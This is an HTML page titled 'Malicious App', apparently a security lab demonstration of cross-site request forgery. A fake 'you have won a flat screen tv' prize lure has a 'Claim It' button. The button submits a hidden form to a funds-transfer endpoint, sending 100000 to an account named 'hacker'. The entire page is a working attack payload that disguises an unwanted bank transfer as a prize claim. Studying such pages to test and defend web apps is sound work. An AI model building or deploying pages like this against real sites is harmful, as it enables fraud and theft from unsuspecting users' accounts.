<!DOCTYPE html>
<html lang="en">

<head>
	<!-- Required meta tags -->
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<!-- Bootstrap CSS -->
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

	<style>
		body {
			height: 100vh;
			display: flex;
			flex-direction: column;
			justify-content: center;
		}
	</style>
	<title>Malicious App</title>
</head>

<body>
	<div class="container">
		<div class="row align-items-md-stretch">
			<div class="col-md-6">
				<div class="h-100 p-5 text-white bg-dark rounded-3">
					<h2 class="text-center">Congratualtions a have won a flat screen tv!</h2><br>
				</div>
			</div>
			<form action="/companyapp/fundsTransfer.php" method="post" class="col-md-6">
			
				<input type="hidden" name="amount" id="amount" value="100000">
			
				<input type="hidden" name="account_name" id="account_name" value="hacker">
			
				<input type="hidden" name="account_number" id="account_number" value="1235435345">
			
				<br><br><br><button class="w-100 btn btn-lg btn-primary" type="submit">Claim It</button>
			</form>
		</div>
	</div>
	<!-- Bootstrap Bundle with Popper -->
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</body>

</html>